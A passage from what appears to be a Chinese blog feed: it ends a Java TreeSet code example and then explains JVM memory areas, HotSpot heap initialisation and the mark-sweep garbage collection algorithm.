<span class="comment">//迭代器遍历：升序</span></span><br><span class="line">        Iterator&lt;String&gt; iteratorAesc = treeSet.iterator();</span><br><span class="line">        <span class="keyword">while</span>(iteratorAesc.hasNext())&#123;</span><br><span class="line">            String str = iteratorAesc.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;遍历元素升序：&quot;</span>+str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//迭代器遍历：降序</span></span><br><span class="line">        Iterator&lt;String&gt; iteratorDesc = treeSet.descendingIterator();</span><br><span class="line">        <span class="keyword">while</span>(iteratorDesc.hasNext())&#123;</span><br><span class="line">            String str = iteratorDesc.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;遍历元素降序：&quot;</span>+str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//元素获取:实现NavigableSet接口</span></span><br><span class="line">        String firstEle = treeSet.first();<span class="comment">//获取TreeSet头节点：</span></span><br><span class="line">        System.out.println(<span class="string">&quot;TreeSet头节点为：&quot;</span> + firstEle);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取指定元素之前的所有元素集合：(不包含指定元素)</span></span><br><span class="line">        SortedSet&lt;String&gt; headSet = treeSet.headSet(<span class="string">&quot;jiaboyan&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;jiaboyan节点之前的元素为：&quot;</span>+headSet.toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取给定元素之间的集合：（包含头，不包含尾）</span></span><br><span class="line">        SortedSet subSet = treeSet.subSet(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;1--jiaboan之间节点元素为：&quot;</span>+subSet.toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//集合判断：</span></span><br><span class="line">        <span class="keyword">boolean</span> isEmpty = treeSet.isEmpty();</span><br><span class="line">        System.out.println(<span class="string">&quot;TreeSet是否为空：&quot;</span>+isEmpty);</span><br><span class="line">        <span class="keyword">boolean</span> isContain = treeSet.contains(<span class="string">&quot;who&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;TreeSet是否包含who元素：&quot;</span>+isContain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//元素删除：</span></span><br><span class="line">        <span class="keyword">boolean</span> jiaboyanRemove = treeSet.remove(<span class="string">&quot;jiaboyan&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;jiaboyan元素是否被删除&quot;</span>+jiaboyanRemove);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//集合中不存在的元素，删除返回false</span></span><br><span class="line">        <span class="keyword">boolean</span> whoRemove = treeSet.remove(<span class="string">&quot;who&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;who元素是否被删除&quot;</span>+whoRemove);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//删除并返回第一个元素：如果set集合不存在元素，则返回null</span></span><br><span class="line">        String pollFirst = treeSet.pollFirst();</span><br><span class="line">        System.out.println(<span class="string">&quot;删除的第一个元素：&quot;</span>+pollFirst);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//删除并返回最后一个元素：如果set集合不存在元素，则返回null</span></span><br><span class="line">        String pollLast = treeSet.pollLast();</span><br><span class="line">        System.out.println(<span class="string">&quot;删除的最后一个元素：&quot;</span>+pollLast);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        treeSet.clear();<span class="comment">//清空集合:</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java虚拟机</title>
    <url>/2021/01/10/java%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="内存区域"><a href="#内存区域" class="headerlink" title="内存区域"></a>内存区域</h1><p>java虚拟机在执行java程序的过程中会把它管理的内存划分成若干个不同的数据区域</p>
<p>主要的区域：堆，栈(程序计数器，本地方法栈，虚拟机栈(局部变量表，操作数栈，返回地址))、方法区、运行时常量池，直接内存(非运行时数据区的一部分)</p>
<p>线程共享：堆，方法区，直接内存</p>
<p>线程私有：程序计数器，虚拟机栈，本地方法栈</p>
<a id="more"></a>

<p><strong>jdk1.8之前</strong></p>
<p><img src="https://qiniu.xiaoming.net.cn/JDK1.8%E4%B9%8B%E5%89%8D%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%BA%E5%9F%9F.png" alt="JDK1.8之前的数据区域"></p>
<p><strong>jdk8</strong></p>
<p><img src="https://qiniu.xiaoming.net.cn/jdk1.8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%BA%E5%9F%9F.png" alt="jdk1.8的数据区域"></p>
<h2 id="1、程序计数器"><a href="#1、程序计数器" class="headerlink" title="1、程序计数器"></a>1、程序计数器</h2><p>程序计数器是一块较小的内存空间，可以看作是当前线程所执行的字节码的行号指示器。用于记录正在执行的虚拟机字节码指令的地址（如果正在执行的是本地方法则为空），<strong>字节码解释器工作时通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等功能都需要依赖这个计数器来完成。</strong></p>
<p>另外，<strong>为了线程切换后能恢复到正确的执行位置，每条线程都需要一个独立的程序计数器，各线程之间计数器互不影响，独立存储，我们称这类内存区域为“线程私有”的内存。</strong></p>
<p>因此，程序计数器主要有两个作用：</p>
<ul>
<li>字节码解释器通过改变程序计数器来依次读取指令，从而实现代码的流程控制，如：顺序执行，选择，循环，异常处理等</li>
<li>在多线程的情况下，程序计数器用于记录当前线程执行的位置，从而当线程被切换回来的时候能够知道该线程上次运行到哪儿了</li>
</ul>
<blockquote>
<p>程序计数器是唯一以一个不会出现<code>OutOfMemoryError</code>的内存区域，它的生命周期随着线程的创建而创建，随着线程的结束而死亡。</p>
</blockquote>
<h3 id="程序计数器为什么是私有的"><a href="#程序计数器为什么是私有的" class="headerlink" title="程序计数器为什么是私有的?"></a>程序计数器为什么是私有的?</h3><p>程序计数器主要有下面两个作用：</p>
<ul>
<li><p>字节码解释器通过改变程序计数器来依次读取指令，从而实现代码的流程控制，如：顺序执行、选择、循环和异常处理。</p>
</li>
<li><p>在多线程的情况下，程序计数器用于记录当前线程执行的位置，从而当线程被切换回来的时候就能够知道该线程上次运行到哪里了</p>
<blockquote>
<p>如果执行的是<code>native</code>方法，程序计数器记录的是<code>undefined</code>地址，只有执行的是java代码时程序计数器记录的才是下一条指令的地址。</p>
</blockquote>
</li>
</ul>
<p>所以，程序计数器私有主要是为了<strong>线程切换后能恢复到正确的执行位置</strong></p>
<h2 id="2、虚拟机栈"><a href="#2、虚拟机栈" class="headerlink" title="2、虚拟机栈"></a>2、虚拟机栈</h2><p>与程序计数器一样，Java虚拟机栈也是线程私有的，它的生命周期与线程相同，描述的是Java方法执行的内存模型，<strong>每次方法调用的数据都是通过栈传递的。</strong></p>
<p>Java内存可以粗糙的分为<strong>堆内存（Heap）和栈内存（Stack）</strong>，其中栈内存就是虚拟机栈，或者说是<strong>虚拟机栈中局部变量表部分</strong>。（实际上，Java虚拟机栈是由一个个栈帧组成，而每个栈帧中都拥有：局部变量表，操作数栈，常量池引用，动态链接，方法出口信息）</p>
<p>局部变量表主要存放了编译器可知的各种数据类型（boolean、byte、char、short、int、float、long、double）、对象引用（reference 类型，它不同于对象本身，可能是一个指向对象起始地址的引用指针，也可能是指向一个代表对象的句柄或其他与此对象相关的位置）。</p>
<p>Java 虚拟机栈会出现两种异常：<code>StackOverFlowError</code>和<code>OutOfMemoryError</code>。</p>
<p><code>StackOverFlowError</code>： 若 Java 虚拟机栈的内存大小不允许动态扩展，那么当线程请求栈的深度超过当前 Java 虚拟机栈的最大深度的时候，就抛出<code>StackOverFlowError</code>异常。</p>
<p><code>OutOfMemoryError</code>： 若 Java 虚拟机栈的内存大小允许动态扩展，且当线程请求栈时内存用完了，无法再动态扩展了，此时抛出<code>OutOfMemoryError</code>异常。</p>
<p>Java 虚拟机栈也是线程私有的，每个线程都有各自的 Java 虚拟机栈，而且随着线程的创建而创建，随着线程的死亡而死亡。</p>
<p><strong>扩展：那么方法/函数如何调用？</strong></p>
<p>Java 栈可用类比数据结构中栈，Java 栈中保存的主要内容是栈帧，每一次函数调用都会有一个对应的栈帧被压入 Java 栈，每一个函数调用结束后，都会有一个栈帧被弹出。</p>
<p>Java 方法有两种返回方式：</p>
<ul>
<li>return 语句。</li>
<li>抛出异常。</li>
</ul>
<p>不管哪种返回方式都会导致栈帧被弹出。</p>
<h2 id="3、什么是本地方法栈"><a href="#3、什么是本地方法栈" class="headerlink" title="3、什么是本地方法栈"></a>3、什么是本地方法栈</h2><p>本地方法栈所发挥的作用和虚拟机栈非常相似，区别是：<strong>虚拟机栈为虚拟机执行Java方法（也就是字节码）服务，而本地方法栈则为虚拟机使用到Native方法服务。</strong></p>
<p>本地方法被执行的时候，在本地方法栈也会创建一个栈帧，用于存放该本地方法的局部变量表、操作数栈、动态链接、出口信息等。</p>
<p>方法执行完毕后相应的栈帧也会出栈并释放内存空间，也会出现<code>StackOverFlowError</code>和<code>OutOfMemoryError</code>两种异常。</p>
<h3 id="虚拟机栈和本地方法栈为什么是私有的"><a href="#虚拟机栈和本地方法栈为什么是私有的" class="headerlink" title="虚拟机栈和本地方法栈为什么是私有的"></a>虚拟机栈和本地方法栈为什么是私有的</h3><ul>
<li>虚拟机栈：每个java方法在执行的同时会创建一个<strong>栈帧</strong>用于存储局部变量表、操作数栈、常量池引用等信息。从方法调用直至执行完成的过程，就对应着一个栈帧在java虚拟机中入栈和出栈的过程。</li>
<li>本地方法栈：和虚拟机栈所发挥的作用非常相似，区别是：<strong>虚拟机栈为虚拟机运行Java方法（也就是字节码）服务，而本地方法栈则为虚拟机所使用到的<code>Native</code>方法服务</strong>。在HotSpot虚拟机中和Java虚拟机栈合二为一。</li>
</ul>
<p>所以，为了保证线程中的局部变量不被别的线程访问到，虚拟机栈和本地方法栈都是私有的。</p>
<h2 id="4、方法区"><a href="#4、方法区" class="headerlink" title="4、方法区"></a>4、方法区</h2><blockquote>
<p>JDK1.8后取消了方法区，改用元空间</p>
</blockquote>
<p>方法区和Java堆一样，是各个线程共享的内存区域，它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。</p>
<p>方法区还有一个别名叫<code>Non-Heap</code>(非堆)，目的是与Java堆区分开来（实际上方法区是堆的一个逻辑部分）</p>
<p>方法区也被称为永久代。</p>
<blockquote>
<p>《Java 虚拟机规范》只是规定了有方法区这么个概念和它的作用，并没有规定如何去实现它。那么，在不同的 JVM 上方法区的实现肯定是不同的了。 方法区和永久代的关系很像 Java 中接口和类的关系，类实现了接口，而永久代就是 HotSpot 虚拟机对虚拟机规范中方法区的一种实现方式。 也就是说，永久代是 HotSpot 的概念，方法区是 Java 虚拟机规范中的定义，是一种规范，而永久代是一种实现，一个是标准一个是实现，其他的虚拟机实现并没有永久代这一说法。</p>
</blockquote>
<p>相对而言，垃圾收集行为在这个区域是比较少出现的，但并非是数据进入方法区后就永久存在了。</p>
<p>JDK1.8的时候，方法区被彻底移除了，取而代之的是<strong>元空间</strong>，元空间使用的是<strong>直接内存</strong>。</p>
<p>可以通过以下参数设置元空间：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-XX:MetaspaceSize&#x3D;N &#x2F;&#x2F;设置Metaspace的初始（和最大大小）</span><br><span class="line">-XX：MaxMetaspaceSize&#x3D;N &#x2F;&#x2F;设置Metaspace的最大大小</span><br></pre></td></tr></table></figure>

<h3 id="为什么要将永久代替换为元空间呢？"><a href="#为什么要将永久代替换为元空间呢？" class="headerlink" title="为什么要将永久代替换为元空间呢？"></a>为什么要将永久代替换为元空间呢？</h3><p>整个永久代有一个JVM本身设置的固定大小上限，无法进行调整，而元空间采用的是直接内存，受本机可用内存的限制，并且永远不会得到<code>java.lang.OutOfMemoryError</code>。可以通过上面的参数设置元空间最大大小，默认是<code>unlimited</code>,意味着它只受系统内存的限制。也可以通过第一个参数标志元空间的初始大小，如果未指定此标志，则元空间将根据运行时的应用程序需求动态的重新调整大小。</p>
<p>此外还有其他很多底层的原因。</p>
<h2 id="5、运行时常量池"><a href="#5、运行时常量池" class="headerlink" title="5、运行时常量池"></a>5、运行时常量池</h2><p>运行时常量池是方法区的一部分。Class文件中除了有类的版本、字段、方法、接口等描述信息外，还有常量池信息（用于存放编译器生成的各种字面量和符号引用）</p>
<p>既然运行时常量池是方法区的一部分，自然受到方法区内存的限制，当常量池无法再申请到内存时会抛出<code>OutOfMemoryError</code>异常。</p>
<p>JDK1.7 及之后版本的JVM已经将运行时常量池从方法区中移了出来，在 Java 堆（Heap）中开辟了一块区域存放运行时常量池。</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E8%BF%90%E8%A1%8C%E6%97%B6%E5%B8%B8%E9%87%8F%E6%B1%A0.png" alt="运行时常量池"></p>
<h2 id="6、直接内存"><a href="#6、直接内存" class="headerlink" title="6、直接内存"></a>6、直接内存</h2><p>直接内存并不是虚拟机运行时数据区的一部分，也不是虚拟机规范中定义的内存区域，但是这部分内存也被频繁地使用。而且也可能导致<code>OutOfMemoryError</code>异常出现。</p>
<p>JDK1.4 中新加入的<code>NIO(New Input/Output)</code>类，引入了一种基于通道（<code>Channel</code>） 与缓存区（<code>Buffer</code>）的<code>I/O</code>方式，它可以直接使用<code>Native</code>函数库直接分配堆外内存，然后通过一个存储在 Java 堆中的<code>DirectByteBuffer</code>对象作为这块内存的引用进行操作。这样就能在一些场景中显著提高性能，因为避免了在 Java 堆和 Native 堆之间来回复制数据。</p>
<p>本机直接内存的分配不会受到 Java 堆的限制，但是，既然是内存就会受到本机总内存大小以及处理器寻址空间的限制。</p>
<h2 id="7、堆"><a href="#7、堆" class="headerlink" title="7、堆"></a>7、堆</h2><p>Java虚拟机所管理的内存中最大的一块，Java堆是所有线程共享的一块内存区域，在虚拟机启动时创建。<strong>此内存区域唯一目的就是存放对象实例，几乎所有的对象实例以及数组都在这里分配内存</strong>。</p>
<p>Java堆是垃圾收集器管理的主要区域，因此也被称为<strong>GC堆</strong>。从垃圾回收角度来说，由于现在收集器基本都采用<strong>分代垃圾收集算法</strong>，所以Java堆还可以细分为：<strong>新生代和老生代</strong>，更细致一点有：**<code>Eden</code>空间，<code>From Survivor</code>，<code>To Survivor</code>空间等**。进一步划分的目的是更好的回收内存，或者更快的分配内存。</p>
<p><img src="https://qiniu.xiaoming.net.cn/%E5%A0%86%E5%88%92%E5%88%86.png" alt="堆划分"></p>
<p>上图中，<code>eden</code>区，s0区，s1区都属于新生代，<code>tentired</code>区属于老生代。大部分情况，对象都会首先在<code>Eden</code>区域分配，在一次新生代垃圾回收后，如果对象还存活，则会进入s0或者s1，并且对象的年龄还会加1（<code>Eden</code>区-&gt;<code>Survivor</code>区后对象的初始年龄变为1），当它的年龄增加到一定程度（<strong>默认是15岁</strong>），就会被晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数<code>-XX:MaxTenuringThreshold</code>来设置。</p>
<h3 id="堆的创建过程"><a href="#堆的创建过程" class="headerlink" title="堆的创建过程"></a>堆的创建过程</h3><p>Java堆初始化的入口为 <code>Universe::initialize_heap()</code>方法，位于<code>hotspot/src/share/vm/memory/universe.cpp</code> 文件中。</p>
<h4 id="首先根据-GC-方式确定-GC-策略与堆实现"><a href="#首先根据-GC-方式确定-GC-策略与堆实现" class="headerlink" title="首先根据 GC 方式确定 GC 策略与堆实现"></a>首先根据 GC 方式确定 GC 策略与堆实现</h4><p>执行流程如下：</p>
<ol>
<li>如果 JVM 使用了并行收集器（<code>-XX:+UseParallelGC</code>），则将堆初始化为 <code>ParallelScavengeHeap</code> 类型，即并行收集堆。</li>
<li>如果 JVM 使用了 <code>G1</code> 收集器（<code>-XX:+UseG1GC</code>），则将堆初始化为 <code>G1CollectedHeap</code> 类型，即 G1堆。同时设置 GC 策略为 G1 专用的<code>G1CollectorPolicy</code>。</li>
<li>如果没有选择以上两种收集器，就继续检查是否使用了串行收集器（<code>-XX:+UseSerialGC</code>），如是，设置 GC 策略为 <code>MarkSweepPolicy</code>，即标记-清除。</li>
<li>再检查到如果使用了 <code>CMS</code> 收集器（<code>-XX:+UseConcMarkSweepGC</code>），就根据是否启用自适应开关（<code>-XX:+UseAdaptiveSizePolicy</code>），设置 GC 策略为自适应的 <code>ASConcurrentMarkSweepPolicy</code>，或者标准的 <code>ConcurrentMarkSweepPolicy</code>。</li>
<li>如果以上情况都没有配置，就采用默认的 GC 策略为 <code>MarkSweepPolicy</code>。对于步骤 3~5 的所有情况，都会将堆初始化为 <code>GenCollectedHeap</code> 类型，即分代收集堆。</li>
<li>调用各堆实现类对应的 <code>initialize()</code> 方法执行堆的初始化操作。</li>
</ol>
<p><img src="http://qiniu.xiaoming.net.cn/GC%E7%AD%96%E7%95%A5%E7%B1%BB%E4%BB%A5%E5%8F%8A%E5%90%84%E4%BB%A3%E5%AE%9E%E7%8E%B0%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB.png" alt="GC策略类以及各代实现类的继承关系"></p>
<h4 id="接着是构造-GC-策略和堆参数"><a href="#接着是构造-GC-策略和堆参数" class="headerlink" title="接着是构造 GC 策略和堆参数"></a>接着是构造 GC 策略和堆参数</h4><p>以 CMS 标准 GC 策略 <code>ConcurrentMarkSweepPolicy</code> 为例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ConcurrentMarkSweepPolicy::ConcurrentMarkSweepPolicy() &#123;</span><br><span class="line">  initialize_all();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该 <code>initialize_all()</code> 方法由 <code>ConcurrentMarkSweepPolicy</code> 的父类 <code>GenCollectorPolicy</code> 来定义。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">virtual void initialize_all() &#123;</span><br><span class="line">  initialize_flags();</span><br><span class="line">  initialize_size_info();</span><br><span class="line">  initialize_generations();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见，这个方法直接调用了另外三个以 <code>initialize</code> 为前缀的方法，它们分别完成特定的功能，下面按顺序来看:</p>
<h5 id="initialize-flags-方法：对齐与校验"><a href="#initialize-flags-方法：对齐与校验" class="headerlink" title="initialize_flags() 方法：对齐与校验"></a>initialize_flags() 方法：对齐与校验</h5><p>对齐分为最大对齐和最小对齐。</p>
<p>这个方法首先调用 <code>set_min_alignment()/set_max_alignment()</code> 设置堆空间的对齐，来看一下最小对齐的定义，这里定义了分代堆空间的粒度，即216B = 64KB，也就是说各代必须至少按64KB对齐。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enum SomePublicConstants &#123;</span><br><span class="line">  LogOfGenGrain &#x3D; 16 ARM_ONLY(+1),</span><br><span class="line">  GenGrain &#x3D; 1 &lt;&lt; LogOfGenGrain</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>最大对齐则通过调用 <code>compute_max_alignment()</code> 方法来计算:</p>
<p><code>GenRemSet</code> 是 JVM 中维护跨代引用的数据结构，通用名称为“记忆集合”（Remember Set）。对于常见的两分代堆而言，跨代引用就是老生代中存在指向新生代对象的引用，如果不预先维护的话，每次新生代 GC 都要去扫描老生代，非常麻烦。<code>GenRemSet</code> 的经典实现是卡表（CardTableRS），本质是字节数组，每个字节（即一张卡）对应老生代中一段连续的内存是否有跨代引用，如图所示。</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E5%8D%A1%E8%A1%A8.png" alt="卡表"></p>
<p>卡表与最大对齐有什么关系呢？看以下方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uintx CardTableModRefBS::ct_max_alignment_constraint() &#123;</span><br><span class="line">  return card_size * os::vm_page_size();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>card_size</code> 为2的9次方 = 512，也就是每张卡对应 512B 的老生代内存。将它与 JVM 的普通页大小（一般是 4KB）相乘，就是最大对齐。如果JVM 启用了大内存分页，就继续用上面的计算结果与大页大小（一般是 2MB 或 4MB）取最小公倍数作为最大对齐。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">size_t GenCollectorPolicy::compute_max_alignment() &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 卡标记阵列和旧版的偏移量阵列也都在os页面中提交。 </span></span><br><span class="line"><span class="comment">   * 确保它们完全装满（以避免部分页面问题），</span></span><br><span class="line"><span class="comment">   * 例如:如果512字节堆对应于1字节条目，并且os页大小为4096，则最大堆大小应为512 * 4096 = 2MB对齐。</span></span><br><span class="line"><span class="comment">   **/</span></span><br><span class="line">  size_t alignment = GenRemSet::max_alignment_constraint(rem_set_name());</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 并行GC对各代进行自己的调整，以避免永久代需要大页面（某些平台上为256M）。 </span></span><br><span class="line"><span class="comment">   * 还应该更新其他收集器以进行自己的对齐，然后应删除对lcm（）的使用。</span></span><br><span class="line"><span class="comment">   **/</span></span><br><span class="line">  <span class="keyword">if</span> (UseLargePages &amp;&amp; !UseParallelGC) &#123;</span><br><span class="line">      alignment = lcm(os::large_page_size(), alignment);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">assert</span>(alignment &gt;= min_alignment(), <span class="string">&quot;Must be&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> alignment;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>堆空间对齐设置完了，接下来调用父类 <code>CollectorPolicy</code> 的同名方法，校验永久代大小（<code>-XX:PermSize</code>、<code>-XX:MaxPermSize</code>）以及一些其他配置。它的流程与本方法实现的校验新生代大小比较相似。</p>
<p>我们知道，新生代可以通过 <code>-XX:NewSize</code>、<code>-XX:MaxNewSize</code> 与 <code>-Xmn</code> 三个参数来设定，设定 <code>-Xmn</code> 就相当于将前两个参数设为相同的值。接下来就将 <code>NewSize</code> 与 <code>MaxNewSize</code> 按64KB向下对齐，并确定它们是 64KB 的倍数。该方法实现基于宏定义，本质是位运算。</p>
<p>因为新生代由一个 <code>Eden</code> 区与两个 <code>Survivor</code> 区组成，所以 <code>NewSize</code> 不能小于 <code>3 * 64 = 192KB</code>。另外，<code>-XX:NewRatio</code> 与 <code>-XX:SurvivorRatio</code> 都不能小于1，亦即<strong>老生代与新生代的比例不能小于1:1，<code>Eden</code> 区与 <code>Survivor</code> 区的比例不能小于1:2</strong>。</p>
<p>需要注意的是，<code>GenCollectorPolicy</code> 的子类<code>TwoGenerationCollectorPolicy</code> 中也有一个同名方法。它先调用了父类的方法，然后校验老生代和最大堆大小。</p>
<p>老生代大小 <code>OldSize</code> 对应JVM参数中的 <code>-XX:OldSize</code>，最大堆大小 <code>MaxHeapSize</code> 自然对应 <code>-Xmx</code>。这样，<strong>新生代、老生代和永久代的参数就都对齐并校验完毕了</strong>。</p>
<h5 id="initialize-size-info-方法：设置堆与分代大小"><a href="#initialize-size-info-方法：设置堆与分代大小" class="headerlink" title="initialize_size_info()方法：设置堆与分代大小"></a>initialize_size_info()方法：设置堆与分代大小</h5><p>与上面的 <code>initialize_flags()</code> 方法相似，这个方法在 <code>CollectorPolicy</code>、<code>GenCollectorPolicy</code>、<code>TwoGenerationCollectorPolicy</code> 中各有一个，分别负责真正设置整个堆、新生代和老生代的大小，并且同样是链式调用。它们的代码都很长，但功能单一，都是比较、对齐与赋值操作。</p>
<h5 id="initialize-generations-方法：生成分代管理器"><a href="#initialize-generations-方法：生成分代管理器" class="headerlink" title="initialize_generations() 方法：生成分代管理器"></a>initialize_generations() 方法：生成分代管理器</h5><p>虽然该方法的名字是“初始化分代”的意思，但它还不会执行真正的初始化动作，而是生成 <code>GenerationSpec</code> 实例，该实例内含有分代的描述信息（名称、大小等），在真正初始化分代时需要用到。这个方法由<code>ConcurrentMarkSweepPolicy</code> 自己实现。</p>
<ul>
<li>首先调用 <code>initialize_perm_generation()</code> 方法生成永久代对应的 <code>PermanentGenerationSpec</code>（代码略）。</li>
<li>然后，检查是否符合 <code>ParNewGeneration::in_use()</code> 的条件，即启用并行新生代GC（<code>-XX:+UseParNewGC</code>）并且GC线程数（<code>-XX:ParallelGCThreads</code>）大于 0</li>
<li>如是，将新生代 <code>GenerationSpec</code> 的类型设置为<code>ParNew</code>，否则设为<code>DefNew</code>。</li>
<li>老生代 <code>GenerationSpec</code> 的类型则固定为 <code>ConcurrentMarkSweep</code>。</li>
</ul>
<p>至此，初始化 GC 策略与堆参数的工作就完成了，下面主要是分配堆内存空间与分代的过程，还有一些其他的工作。</p>
<h4 id="分配堆内存空间与分代"><a href="#分配堆内存空间与分代" class="headerlink" title="分配堆内存空间与分代"></a>分配堆内存空间与分代</h4><h5 id="最后一次对齐"><a href="#最后一次对齐" class="headerlink" title="最后一次对齐"></a>最后一次对齐</h5><p>在创建分代之前，再将它们对齐一次,分代数量固定为2。新生代和老生代都是按最小粒度（即64KB）对齐，永久代则是按最大粒度对齐。</p>
<h5 id="分配堆内存空间"><a href="#分配堆内存空间" class="headerlink" title="分配堆内存空间"></a>分配堆内存空间</h5><p>主要作用的是通过 <code>allocate()</code> 方法，将一段连续的内存空间分配成<code>ReservedSpace</code>，即预留空间。</p>
<p>该方法的大致执行流程如下：</p>
<ol>
<li>确定当前的页大小。</li>
<li>根据新生代、老生代和永久代的各个 <code>GenerationSpec</code>，将它们的最大内存大小累加到 <code>total_reserved</code> 变量，作为申请内存的总量。</li>
<li>同时将 <code>GenerationSpec</code> 中的 <code>n_covered_regions</code> 一同累加，该字段代表申请内存区域的数量，新生代、老生代都为1，永久代为2。</li>
<li>如果配置为大页模式，将申请内存的量向上对齐到页大小。</li>
<li>若启用了压缩普通对象指针（<code>-XX:+UseCompressedOops</code>），调用 <code>Universe::preferred_heap_base()</code> 方法，以32位直接压缩的方式（<code>UnscaledNarrowOop</code>）取得堆的基地址，并调用 <code>ReservedHeapSpace</code> 的构造方法，申请内存。</li>
<li>如果上一步申请失败，说明比 4GB 大，就以零基地址压缩的方式（<code>ZeroBasedNarrowOop</code>）在更高的地址空间上取得堆的基地址并申请内存。</li>
<li>如果仍然申请失败，说明比 32GB 还大，就只能用普通的指针压缩方式（<code>HeapBasedNarrowOop</code>）取得堆的基地址并申请内存。</li>
<li>如果没有启用压缩普通对象指针，就直接用 <code>ReservedHeapSpace</code> 申请内存。最终都返回起始地址。</li>
</ol>
<p>如果堆要在指定地址分配，亦即配置了共享空间或者指针压缩，就调用<code>os::attempt_reserve_memory_at()</code> 内存，否则就调用 <code>os::reserve_memory()</code> 方法申请内存。申请成功之后仍然要对齐，方法是先检查基地址是否对齐，如果没有，就直接释放掉分配的空间，将内存大小向上对齐之后，调用 <code>os::reserve_memory_aligned()</code> 重新申请一块对齐的空间。</p>
<h5 id="调整堆大小并创建GenRemSet-记忆集合）"><a href="#调整堆大小并创建GenRemSet-记忆集合）" class="headerlink" title="调整堆大小并创建GenRemSet(记忆集合）"></a>调整堆大小并创建GenRemSet(记忆集合）</h5><p>首先将堆空间封装成一个 <code>MemRegion</code> 对象，然后将前面的堆大小减去永久代中 <code>Misc Code</code> 与 <code>Misc Data</code> 两个区域的大小，就是堆的实际大小。最后，调用 GC 策略的 <code>create_rem_set()</code> 方法生成 <code>GenRemSet</code> 的实现，对于 CMS 而言就是 <code>CardTableRS</code>，即卡表。</p>
<h5 id="分代初始化"><a href="#分代初始化" class="headerlink" title="分代初始化"></a>分代初始化</h5><p>各个 <code>GenerationSpec</code>n中都有一个 <code>init()</code> 方法来初始化它对应的分代，主体是一个 <code>switch-case</code> 结构。CMS 情况下的 <code>ParNew</code> 与 <code>ConcurrentMarkSweep</code> 分代实现：新生代对应的是 <code>ParNewGeneration</code> 实现，老生代对应的是 <code>ConcurrentMarkSweepGeneration</code> 实现。根据<code>GenerationSpec</code> 中记录的内存大小，就可以将之前申请的堆空间划分给各个代。</p>
<p>整个堆空间至此就基本创建完成了。</p>
<h1 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h1><h2 id="1、垃圾回收算法"><a href="#1、垃圾回收算法" class="headerlink" title="1、垃圾回收算法"></a>1、垃圾回收算法</h2><h3 id="标记-清除算法"><a href="#标记-清除算法" class="headerlink" title="标记-清除算法"></a>标记-清除算法</h3><p>该算法分为“标记”和“清除”阶段：首先标记出所有需要回收的对象，在标记完成后统一回收所有被标记的对象。</p>
<p>在标记阶段，程序会检查每个对象是否为活动对象，如果是活动对象，则程序会在对象头部打上标记。</p>
<p>在清除阶段，会进行对象回收并取消标志位，另外，还会判断回收后的分块与前一空闲分块是否连续，若连续，则合并这两个分块。回收对象就是把对象作为分块，连接到被称为“空闲链表”的单向链表，之后进行分配时只需要遍历这个空闲链表，就可以找到分块。</p>
<p>在分配时，程序会搜索空闲链表寻找空间大于等于新对象大小<code>size</code>的块<code>block</code>。如果它找到的块等于<code>size</code>，会直接返回这个分块；如果找到的块大于<code>size</code>，会将块分割成大小为<code>size</code>与<code>block - size</code>的两部分，返回大小为<code>size</code>的分块，并把大小为<code>block - size</code>的块返回给空闲链表。</p>
<p>它是最基础的收集算法，后续的算法都是对其不足进行改进得到的。这种垃圾收集算法有两个明显的问题：</p>
<ul>
<li>标记和清除的效率都不高</li>
<li>空间问题（标记清除后会产生大量不连续的碎片）</li>
</ul>
